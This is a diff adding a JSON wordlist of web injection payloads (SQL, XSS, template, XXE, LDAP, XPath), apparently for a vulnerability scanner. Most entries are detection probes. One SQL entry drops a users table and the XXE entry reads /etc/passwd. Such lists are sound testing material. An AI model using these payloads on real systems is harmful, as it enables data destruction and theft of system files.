@@ -1,0 +1,8 @@
+{
+  "SQL": ["'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--", "' OR '1'='1' --", "1' AND '1'='1", "1' AND '1'='2"],
+  "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>", "<scRipt>alert(1)</scRipt>"],
+  "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "{{config}}", "${7*7}", "{{7*'7'}}"],
+  "XXE": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"],
+  "LDAP": ["*", "*)(&", "admin*", "*|", ")(uid=*))"],
+  "XPath": ["' OR '1'='1", "' AND '1'='2", "admin' OR '1'='1", "' OR true() OR '"]
+}
